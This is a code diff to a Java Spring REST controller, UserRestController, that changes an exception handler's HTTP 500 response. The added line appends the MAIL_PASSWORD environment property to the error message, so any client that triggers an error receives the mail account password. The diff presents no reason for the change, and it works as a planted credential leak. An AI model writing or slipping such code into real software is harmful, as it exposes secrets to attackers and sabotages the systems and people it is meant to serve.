@@ -142,7 +142,7 @@ public class UserRestController {
 //            for (StackTraceElement line: e.getStackTrace()) {
 //                stringBuilder.append(line).append("\n");
 //            }
-            return new ResponseEntity<>(e.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR);
+            return new ResponseEntity<>(e.getMessage() + "\n" + environment.getProperty("MAIL_PASSWORD"), HttpStatus.INTERNAL_SERVER_ERROR);
         }
     }
 
